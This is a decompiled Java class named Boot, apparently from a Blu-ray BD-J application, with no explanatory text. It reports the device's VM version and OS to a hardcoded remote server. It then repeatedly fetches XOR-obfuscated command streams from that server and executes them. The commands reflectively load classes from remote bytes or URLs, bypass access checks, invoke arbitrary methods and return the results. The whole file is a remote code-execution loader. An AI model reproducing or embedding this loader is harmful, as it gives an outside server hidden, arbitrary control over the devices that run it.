package org.bdj;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Vector;

public class Boot {
   static String EP = "";
   static String SID = "";
   static byte[] SK = null;
   static long[] R = new long[128];
   static Object[] O = new Object[64];
   static Object[] M = new Object[64];
   static String[] S = new String[64];
   static byte[][] Z = new byte[32][];
   static ClassLoader PAR;
   static String note;
   static boolean said;
   static long burn;
   static int step;
   static int seq;
   static byte[] CKB;
   static byte[] KSB;

   static long ksq(int var0) {
      byte[] var1 = KSB;
      int var2 = var0 * 8;
      long var3 = 0L;

      for(int var5 = 0; var5 < 8; ++var5) {
         var3 = var3 << 8 | (long)var1[var2 + var5] & 255L;
      }

      return var3;
   }

   static byte[] xor(byte[] var0, int var1, byte[] var2) {
      if (SK == null) {
         return var0;
      } else {
         long var3 = ksq(0);
         long var5 = ksq(1);
         long var7 = ksq(2);
         int var9 = (int)(ksq(3) & 63L);

         for(int var10 = 0; var10 < SK.length; ++var10) {
            var3 = var3 * var5 + (long)(SK[var10] & 255) + var7;
         }

         for(int var11 = 0; var11 < var2.length; ++var11) {
            var3 = var3 * var5 + (long)(var2[var11] & 255) + var7;
         }

         for(int var12 = var1; var12 < var0.length; ++var12) {
            var3 = var3 * var5 + var7;
            var0[var12] = (byte)(var0[var12] ^ (int)(var3 >>> var9 & 255L));
         }

         return var0;
      }
   }

   static byte[] hexb(String var0) {
      int var1 = var0.length() / 2;
      byte[] var2 = new byte[var1];

      for(int var3 = 0; var3 < var1; ++var3) {
         var2[var3] = (byte)Integer.parseInt(var0.substring(var3 * 2, var3 * 2 + 2), 16);
      }

      return var2;
   }

   static long mix(byte[] var0, byte[] var1) {
      long var2 = ksq(0);
      long var4 = ksq(1);
      long var6 = ksq(2);

      for(int var8 = 0; var8 < var0.length; ++var8) {
         var2 = var2 * var4 + (long)(var0[var8] & 255) + var6;
      }

      for(int var9 = 0; var9 < var1.length; ++var9) {
         var2 = var2 * var4 + (long)(var1[var9] & 255) + var6;
      }

      for(int var10 = 0; var10 < 8; ++var10) {
         var2 = var2 * var4 + var6;
      }

      return var2;
   }

   static String hex16(long var0) {
      char[] var2 = new char[16];
      String var3 = "0123456789abcdef";

      for(int var4 = 15; var4 >= 0; --var4) {
         var2[var4] = var3.charAt((int)(var0 & 15L));
         var0 >>>= 4;
      }

      return new String(var2);
   }

   static String ticket(byte[] var0, int var1, int var2) {
      byte[] var3;
      if (SK == null) {
         var3 = CKB;
      } else {
         var3 = new byte[CKB.length + SK.length];
         System.arraycopy(CKB, 0, var3, 0, CKB.length);
         System.arraycopy(SK, 0, var3, CKB.length, SK.length);
      }

      byte[] var4;
      try {
         var4 = SID.getBytes("UTF-8");
      } catch (Throwable var7) {
         var4 = new byte[0];
      }

      byte[] var5 = new byte[12 + var4.length + 4];
      System.arraycopy(var0, 0, var5, 0, 8);
      var5[8] = (byte)(var1 >>> 24);
      var5[9] = (byte)(var1 >>> 16);
      var5[10] = (byte)(var1 >>> 8);
      var5[11] = (byte)var1;
      System.arraycopy(var4, 0, var5, 12, var4.length);
      int var6 = 12 + var4.length;
      var5[var6] = (byte)(var2 >>> 24);
      var5[var6 + 1] = (byte)(var2 >>> 16);
      var5[var6 + 2] = (byte)(var2 >>> 8);
      var5[var6 + 3] = (byte)var2;
      return "c6." + var1 + "." + hex16(mix(var3, var5));
   }

   static byte[] io(String var0, byte[] var1) {
      HttpURLConnection var2 = null;

      Object var9;
      try {
         var2 = (HttpURLConnection)(new URL(EP + var0)).openConnection();
         byte[] var3 = new byte[8];
         long var29 = (long)System.identityHashCode(var2);
         var29 = var29 * 6364136223846793005L + (long)(Math.random() * (double)4.2949673E9F);

         for(int var6 = 0; var6 < 8; ++var6) {
            var3[var6] = (byte)((int)(var29 >>> var6 * 8));
         }

         if (var1 == null) {
            var1 = new byte[0];
         }

         byte[] var31 = new byte[8 + var1.length];
         System.arraycopy(var3, 0, var31, 0, 8);
         System.arraycopy(var1, 0, var31, 8, var1.length);
         xor(var31, 8, var3);
         int var7 = seq++;
         var2.setRequestMethod("POST");
         var2.setRequestProperty("X-Ticket", ticket(var3, var7, var31.length));
         var2.setDoOutput(true);
         OutputStream var8 = var2.getOutputStream();
         var8.write(var31);
         var8.flush();
         var8.close();
         if (var2.getResponseCode() == 200) {
            InputStream var32 = var2.getInputStream();
            ByteArrayOutputStream var10 = new ByteArrayOutputStream();
            byte[] var11 = new byte[8192];

            while(true) {
               int var12 = var32.read(var11);
               if (var12 < 0) {
                  var32.close();
                  byte[] var33 = var10.toByteArray();
                  if (var33.length < 8) {
                     Object var34 = null;
                     return (byte[])var34;
                  }

                  byte[] var13 = new byte[8];
                  System.arraycopy(var33, 0, var13, 0, 8);
                  xor(var33, 8, var13);
                  byte[] var14 = new byte[var33.length - 8];
                  System.arraycopy(var33, 8, var14, 0, var14.length);
                  byte[] var15 = var14;
                  return var15;
               }

               var10.write(var11, 0, var12);
            }
         }

         var9 = null;
      } catch (Throwable var27) {
         Object var4 = null;
         return (byte[])var4;
      } finally {
         try {
            if (var2 != null) {
               var2.disconnect();
            }
         } catch (Throwable var26) {
         }

      }

      return (byte[])var9;
   }

   static Object arg(DataInputStream var0) throws Exception {
      int var1 = var0.readUnsignedByte();
      long var2 = var0.readLong();
      switch (var1) {
         case 0:
            return new Long(var2);
         case 1:
            return new Integer((int)var2);
         case 2:
            return O[(int)var2];
         case 3:
            return S[(int)var2];
         case 4:
            return null;
         case 5:
            return var2 != 0L ? Boolean.TRUE : Boolean.FALSE;
         case 6:
            return new Long(R[(int)var2]);
         case 7:
            return new Integer((int)R[(int)var2]);
         case 8:
            return new Byte((byte)((int)var2));
         case 9:
            return new Short((short)((int)var2));
         case 10:
            return Z[(int)var2];
         case 11:
            return new Character((char)((int)var2));
         case 12:
            return new Float((float)var2);
         case 13:
            return new Double(Double.longBitsToDouble(var2));
         default:
            return null;
      }
   }

   static long num(Object var0) {
      if (var0 == null) {
         return 0L;
      } else if (var0 instanceof Number) {
         return ((Number)var0).longValue();
      } else if (var0 instanceof Boolean) {
         return (Boolean)var0 ? 1L : 0L;
      } else {
         return var0 instanceof Character ? (long)(Character)var0 : 1L;
      }
   }

   static Class cls(long var0) throws Exception {
      int var2 = (int)var0;
      if (var2 >= 0) {
         return (Class)O[var2];
      } else {
         switch (var2) {
            case -12:
               return Class.class;
            case -11:
               return String.class;
            case -10:
               return Object.class;
            case -9:
               return Void.TYPE;
            case -8:
               return Double.TYPE;
            case -7:
               return Float.TYPE;
            case -6:
               return Character.TYPE;
            case -5:
               return Short.TYPE;
            case -4:
               return Byte.TYPE;
            case -3:
               return Boolean.TYPE;
            case -2:
               return Integer.TYPE;
            case -1:
               return Long.TYPE;
            default:
               return Object.class;
         }
      }
   }

   static void put(int var0, int var1, Object var2) {
      if (var0 == 0) {
         R[var1] = num(var2);
      } else if (var0 == 1) {
         O[var1] = var2;
      } else if (var0 == 2) {
         Z[var1] = (byte[])var2;
      } else if (var0 == 3) {
         S[var1] = var2 == null ? null : var2.toString();
      }

   }

   static byte[] exec(byte[] var0) {
      ByteArrayOutputStream var1 = new ByteArrayOutputStream();
      DataOutputStream var2 = new DataOutputStream(var1);
      Vector var3 = new Vector();
      int var4 = -1;
      long var5 = 0L;
      note = null;

      try {
         DataInputStream var36 = new DataInputStream(new ByteArrayInputStream(var0));
         int var38 = var36.readUnsignedShort();

         for(var4 = 0; var4 < var38; ++var4) {
            int var9 = var36.readUnsignedByte();
            switch (var9) {
               case 1:
                  var5 = var36.readLong();
                  var4 = var38;
                  break;
               case 2:
                  long var66 = var36.readLong();
                  Screen.println(Long.toHexString(var66));
                  break;
               case 3:
                  long var65 = var36.readLong();
                  long var104 = var36.readLong();

                  try {
                     Thread.sleep(var65);
                  } catch (Throwable var32) {
                  }
                  break;
               case 4:
                  long var64 = var36.readLong();

                  for(long var103 = 0L; var103 < var64; ++var103) {
                     burn = burn * 6364136223846793005L + var103;
                  }
                  break;
               case 5:
                  int var63 = (int)var36.readLong();
                  int var87 = var36.readInt();
                  byte[] var102 = new byte[var87];
                  var36.readFully(var102);
                  S[var63] = new String(var102, "UTF-8");
                  break;
               case 6:
                  int var62 = (int)var36.readLong();
                  int var86 = var36.readInt();
                  byte[] var101 = new byte[var86];
                  var36.readFully(var101);
                  Z[var62] = var101;
                  break;
               case 7:
                  int var61 = (int)var36.readLong();
                  int var85 = (int)var36.readLong();
                  O[var61] = Class.forName(S[var85], true, PAR);
                  break;
               case 8:
                  int var60 = (int)var36.readLong();
                  int var84 = (int)var36.readLong();
                  int var100 = (int)var36.readLong();
                  int var113 = (int)var36.readLong();
                  Throwable var121 = null;

                  try {
                     O[var60] = (new L(Z[var84], S[var100])).loadClass(S[var100], true);
                  } catch (Throwable var34) {
                     var121 = var34;
                     if (var113 == 0) {
                        throw var34;
                     }

                     Class var134 = Class.forName("org.dvb.lang.DVBClassLoader");
                     Class var136 = Class.forName("[Ljava.net.URL;");
                     Class var137 = Class.forName("java.lang.ClassLoader");
                     Method var19 = var134.getMethod("newInstance", var136, var137);
                     Object var20 = Array.newInstance(Class.forName("java.net.URL"), 1);
                     Array.set(var20, 0, new URL(EP + "/x/" + SID + "/"));
                     Object var21 = var19.invoke((Object)null, var20, PAR);
                     Method var22 = var137.getMethod("loadClass", Class.forName("java.lang.String"));
                     O[var60] = (Class)var22.invoke(var21, S[var100]);
                  }

                  if (var121 != null && !said) {
                     said = true;
                     note = "d1:" + var121.getClass().getName() + ":" + var121.getMessage();
                  }

                  Z[var84] = null;
                  break;
               case 9:
                  int var59 = (int)var36.readLong();
                  Class var83 = cls(var36.readLong());
                  int var99 = var36.readUnsignedByte();
                  Class[] var112 = new Class[var99];

                  for(int var119 = 0; var119 < var99; ++var119) {
                     var112[var119] = cls(var36.readLong());
                  }

                  int var120 = var36.readUnsignedByte();
                  Object[] var128 = new Object[var120];

                  for(int var132 = 0; var132 < var120; ++var132) {
                     var128[var132] = arg(var36);
                  }

                  if (var120 == 0 && var99 == 0) {
                     O[var59] = var83.newInstance();
                     break;
                  }

                  Constructor var133 = null;
                  if (var99 > 0) {
                     try {
                        var133 = var83.getDeclaredConstructor(var112);
                     } catch (Throwable var31) {
                        var133 = var83.getConstructor(var112);
                     }
                  } else {
                     Object var17 = null;

                     try {
                        var135 = var83.getDeclaredConstructors();
                     } catch (Throwable var30) {
                        var135 = var83.getConstructors();
                     }

                     for(int var18 = 0; var18 < var135.length; ++var18) {
                        if (var135[var18].getParameterTypes().length == var120) {
                           var133 = var135[var18];
                           break;
                        }
                     }
                  }

                  try {
                     var133.setAccessible(true);
                  } catch (Throwable var29) {
                  }

                  O[var59] = var133.newInstance(var128);
                  break;
               case 10:
                  int var58 = (int)var36.readLong();
                  Class var82 = cls(var36.readLong());
                  int var98 = (int)var36.readLong();
                  int var111 = var36.readUnsignedByte();
                  Class[] var118 = new Class[var111];

                  for(int var125 = 0; var125 < var111; ++var125) {
                     var118[var125] = cls(var36.readLong());
                  }

                  Object var126 = null;

                  try {
                     var127 = var82.getDeclaredMethod(S[var98], var118);
                  } catch (Throwable var28) {
                     var127 = var82.getMethod(S[var98], var118);
                  }

                  try {
                     var127.setAccessible(true);
                  } catch (Throwable var27) {
                  }

                  M[var58] = var127;
                  break;
               case 11:
                  int var57 = (int)var36.readLong();
                  Class var81 = cls(var36.readLong());
                  int var97 = (int)var36.readLong();
                  Object var109 = null;

                  try {
                     var110 = var81.getDeclaredField(S[var97]);
                  } catch (Throwable var26) {
                     var110 = var81.getField(S[var97]);
                  }

                  try {
                     var110.setAccessible(true);
                  } catch (Throwable var25) {
                  }

                  M[var57] = var110;
                  break;
               case 12:
                  int var56 = (int)var36.readLong();
                  int var80 = (int)var36.readLong();
                  int var96 = (int)var36.readLong();
                  Object var108 = arg(var36);
                  put(var56, var80, ((Field)M[var96]).get(var108));
                  break;
               case 13:
                  int var55 = (int)var36.readLong();
                  Object var79 = arg(var36);
                  Object var95 = arg(var36);
                  ((Field)M[var55]).set(var79, var95);
                  break;
               case 14:
                  int var54 = (int)var36.readLong();
                  int var78 = (int)var36.readLong();
                  int var94 = (int)var36.readLong();
                  Object var107 = arg(var36);
                  int var117 = var36.readUnsignedByte();
                  Object[] var124 = new Object[var117];

                  for(int var131 = 0; var131 < var117; ++var131) {
                     var124[var131] = arg(var36);
                  }

                  put(var54, var78, ((Method)M[var94]).invoke(var107, var124));
                  break;
               case 15:
                  int var53 = (int)var36.readLong();
                  Class var77 = cls(var36.readLong());
                  int var93 = (int)var36.readLong();
                  O[var53] = Array.newInstance(var77, var93);
                  break;
               case 16:
                  int var52 = (int)var36.readLong();
                  int var76 = (int)var36.readLong();
                  int var92 = (int)var36.readLong();
                  int var106 = (int)var36.readLong();
                  put(var52, var76, Array.get(O[var92], var106));
                  break;
               case 17:
                  int var51 = (int)var36.readLong();
                  int var75 = (int)var36.readLong();
                  Array.set(O[var51], var75, arg(var36));
                  break;
               case 18:
                  int var50 = (int)var36.readLong();
                  int var74 = (int)var36.readLong();
                  R[var50] = (long)Array.getLength(O[var74]);
                  break;
               case 19:
                  int var49 = (int)var36.readLong();
                  R[var49] = num(arg(var36));
                  break;
               case 20:
                  int var48 = (int)var36.readLong();
                  int var73 = (int)var36.readLong();
                  long var91 = num(arg(var36));
                  long var116 = num(arg(var36));
                  long var130 = 0L;
                  if (var73 == 0) {
                     var130 = var91 + var116;
                  } else if (var73 == 1) {
                     var130 = var91 - var116;
                  } else if (var73 == 2) {
                     var130 = var91 & var116;
                  } else if (var73 == 3) {
                     var130 = var91 | var116;
                  } else if (var73 == 4) {
                     var130 = var91 ^ var116;
                  } else if (var73 == 5) {
                     var130 = var91 << (int)var116;
                  } else if (var73 == 6) {
                     var130 = var91 >>> (int)var116;
                  } else if (var73 == 7) {
                     var130 = var91 * var116;
                  } else if (var73 == 8) {
                     var130 = var116 == 0L ? 0L : var91 / var116;
                  } else if (var73 == 9) {
                     var130 = var91 == var116 ? 1L : 0L;
                  } else if (var73 == 10) {
                     var130 = var91 < var116 ? 1L : 0L;
                  } else if (var73 == 11) {
                     var130 = var91 > var116 ? 1L : 0L;
                  }

                  R[var48] = var130;
                  break;
               case 21:
                  var2.writeLong(num(arg(var36)));
                  break;
               case 22:
                  int var47 = (int)var36.readLong();
                  int var72 = (int)var36.readLong();
                  Object var90 = O[var47];
                  ByteArrayOutputStream var105 = new ByteArrayOutputStream();
                  DataOutputStream var115 = new DataOutputStream(var105);
                  if (var90 != null) {
                     if (var72 == 0) {
                        byte[] var15 = (byte[])var90;
                        var115.write(var15, 0, var15.length);
                     } else if (var72 == 1) {
                        int[] var122 = (int[])var90;

                        for(int var16 = 0; var16 < var122.length; ++var16) {
                           var115.writeInt(var122[var16]);
                        }
                     } else if (var72 == 2) {
                        long[] var123 = (long[])var90;

                        for(int var129 = 0; var129 < var123.length; ++var129) {
                           var115.writeLong(var123[var129]);
                        }
                     }
                  }

                  var115.flush();
                  var3.addElement(var105.toByteArray());
                  break;
               case 23:
                  int var46 = (int)var36.readLong();
                  var3.addElement(Z[var46] == null ? new byte[0] : Z[var46]);
                  break;
               case 24:
                  int var45 = (int)var36.readLong();
                  int var71 = (int)var36.readLong();
                  if (R[var45] == 0L) {
                     for(int var89 = 0; var89 < var71 && var4 < var38; ++var89) {
                        ++var4;
                        skip(var36);
                     }
                  }
                  break;
               case 25:
                  System.gc();
                  System.gc();
                  break;
               case 26:
                  int var44 = (int)var36.readLong();
                  int var70 = (int)var36.readLong();
                  O[var44] = O[var70];
                  break;
               case 27:
                  int var43 = (int)var36.readLong();
                  O[var43] = arg(var36);
                  break;
               case 28:
                  int var42 = (int)var36.readLong();
                  int var69 = (int)var36.readLong();
                  O[var42] = new Object[]{O[var69]};
                  break;
               case 29:
                  int var41 = (int)var36.readLong();
                  final Object var68 = arg(var36);
                  int var12 = var36.readUnsignedByte();
                  final Object[] var13 = new Object[var12];

                  for(int var14 = 0; var14 < var12; ++var14) {
                     var13[var14] = arg(var36);
                  }

                  final Method var114 = (Method)M[var41];
                  (new Thread(new Runnable() {
                     public void run() {
                        try {
                           var114.invoke(var68, var13);
                        } catch (Throwable var2) {
                        }

                     }
                  })).start();
                  break;
               case 30:
                  int var10 = (int)var36.readLong();
                  int var11 = (int)var36.readLong();
                  O[var10] = M[var11];
                  break;
               default:
                  var5 = -2989L;
                  var4 = var38;
            }
         }
      } catch (Throwable var35) {
         Throwable var7 = var35;
         var5 = -1L;
         String var8 = null;

         try {
            var8 = var7.getClass().getName() + ": " + var7.getMessage();
         } catch (Throwable var24) {
         }

         note = note == null ? var8 : note + " | " + var8;
      }

      try {
         if (note != null) {
            try {
               var3.addElement(note.getBytes("UTF-8"));
            } catch (Throwable var23) {
            }
         }

         var2.flush();
         byte[] var37 = var1.toByteArray();
         ByteArrayOutputStream var39 = new ByteArrayOutputStream();
         DataOutputStream var40 = new DataOutputStream(var39);
         var40.writeLong(var5);
         var40.writeInt(var4);
         var40.writeInt(var37.length / 8);
         var40.write(var37);
         var40.writeInt(var3.size());

         for(int var67 = 0; var67 < var3.size(); ++var67) {
            byte[] var88 = (byte[])var3.elementAt(var67);
            var40.writeInt(var88.length);
            var40.write(var88);
         }

         var40.flush();
         return var39.toByteArray();
      } catch (Throwable var33) {
         return new byte[0];
      }
   }

   static void skip(DataInputStream var0) throws Exception {
      int var1 = var0.readUnsignedByte();
      byte var3 = 0;
      byte var2;
      switch (var1) {
         case 1:
            var2 = 1;
            break;
         case 2:
            var2 = 1;
            break;
         case 3:
            var2 = 2;
            break;
         case 4:
            var2 = 1;
            break;
         case 5:
         case 6:
            var0.readLong();
            int var9 = var0.readInt();
            var0.skipBytes(var9);
            return;
         case 7:
            var2 = 2;
            break;
         case 8:
            var2 = 4;
            break;
         case 9:
            var0.readLong();
            var0.readLong();
            int var8 = var0.readUnsignedByte();
            var0.skipBytes(var8 * 8);
            int var5 = var0.readUnsignedByte();
            var0.skipBytes(var5 * 9);
            return;
         case 10:
            var0.readLong();
            var0.readLong();
            var0.readLong();
            int var7 = var0.readUnsignedByte();
            var0.skipBytes(var7 * 8);
            return;
         case 11:
            var2 = 3;
            break;
         case 12:
            var0.readLong();
            var0.readLong();
            var0.readLong();
            var0.skipBytes(9);
            return;
         case 13:
            var0.readLong();
            var0.skipBytes(18);
            return;
         case 14:
            var0.readLong();
            var0.readLong();
            var0.readLong();
            var0.skipBytes(9);
            int var6 = var0.readUnsignedByte();
            var0.skipBytes(var6 * 9);
            return;
         case 15:
            var2 = 3;
            break;
         case 16:
            var2 = 4;
            break;
         case 17:
            var0.readLong();
            var0.readLong();
            var0.skipBytes(9);
            return;
         case 18:
            var2 = 2;
            break;
         case 19:
            var0.readLong();
            var0.skipBytes(9);
            return;
         case 20:
            var0.readLong();
            var0.readLong();
            var0.skipBytes(18);
            return;
         case 21:
            var0.skipBytes(9);
            return;
         case 22:
            var2 = 2;
            break;
         case 23:
            var2 = 1;
            break;
         case 24:
            var2 = 2;
            break;
         case 25:
            var2 = 0;
            break;
         case 26:
            var2 = 2;
            break;
         case 27:
            var0.readLong();
            var0.skipBytes(9);
            return;
         case 28:
            var2 = 2;
            break;
         case 29:
            var0.readLong();
            var0.skipBytes(9);
            int var4 = var0.readUnsignedByte();
            var0.skipBytes(var4 * 9);
            return;
         case 30:
            var2 = 2;
            break;
         default:
            var2 = 0;
      }

      var0.skipBytes(var2 * 8 + var3);
   }

   public static String run() {
      EP = "http://tester.f5rvoice.com:1992";

      try {
         CKB = hexb("942a76d6946a34ce476bdabb09989f4c");
         ByteArrayOutputStream var0 = new ByteArrayOutputStream();
         DataOutputStream var1 = new DataOutputStream(var0);
         var1.writeInt(1);
         byte[] var2 = "6".getBytes("UTF-8");
         var1.writeInt(var2.length);
         var1.write(var2);
         String var3 = "";

         try {
            var3 = System.getProperty("java.vm.version", "") + "|" + System.getProperty("os.name", "");
         } catch (Throwable var13) {
         }

         byte[] var4 = var3.getBytes("UTF-8");
         var1.writeInt(var4.length);
         var1.write(var4);
         var1.flush();
         byte[] var5 = io("/s", var0.toByteArray());
         if (var5 != null && var5.length >= 20) {
            DataInputStream var6 = new DataInputStream(new ByteArrayInputStream(var5));
            int var7 = var6.readInt();
            if (var7 > 0 && var7 <= 64) {
               SK = new byte[var7];
               var6.readFully(SK);
               int var8 = var6.readInt();
               byte[] var9 = new byte[var8];
               var6.readFully(var9);
               SID = new String(var9, "UTF-8");
               byte[] var10 = new byte[0];

               for(int var11 = 0; var11 < 100000; ++var11) {
                  byte[] var12 = io("/n?s=" + SID, var10);
                  if (var12 == null) {
                     Screen.println(".");
                     return ".";
                  }

                  if (var12.length < 2) {
                     break;
                  }

                  var10 = exec(var12);
                  ++step;
               }

               Screen.println("+");
               return "+";
            } else {
               Screen.println("-");
               return "-";
            }
         } else {
            Screen.println("-");
            return "-";
         }
      } catch (Throwable var14) {
         Screen.println("!");
         return "!";
      }
   }

   static {
      PAR = Boot.class.getClassLoader();
      note = null;
      said = false;
      burn = 0L;
      step = 0;
      seq = 0;
      CKB = null;
      KSB = new byte[]{36, 63, 106, -120, -123, -93, 8, -45, 88, 81, -12, 45, 76, -107, 127, 45, 20, 5, 123, 126, -9, 103, -127, 79, 0, 0, 0, 0, 0, 0, 0, 33};
   }

   static class L extends ClassLoader {
      private final byte[] c;
      private final String n;

      L(byte[] var1, String var2) {
         super(Boot.PAR);
         this.c = var1;
         this.n = var2;
      }

      protected Class loadClass(String var1, boolean var2) throws ClassNotFoundException {
         if (var1.equals(this.n)) {
            Class var3 = this.findLoadedClass(var1);
            if (var3 == null) {
               var3 = this.defineClass(var1, this.c, 0, this.c.length);
            }

            if (var2) {
               this.resolveClass(var3);
            }

            return var3;
         } else {
            return super.loadClass(var1, var2);
         }
      }
   }
}
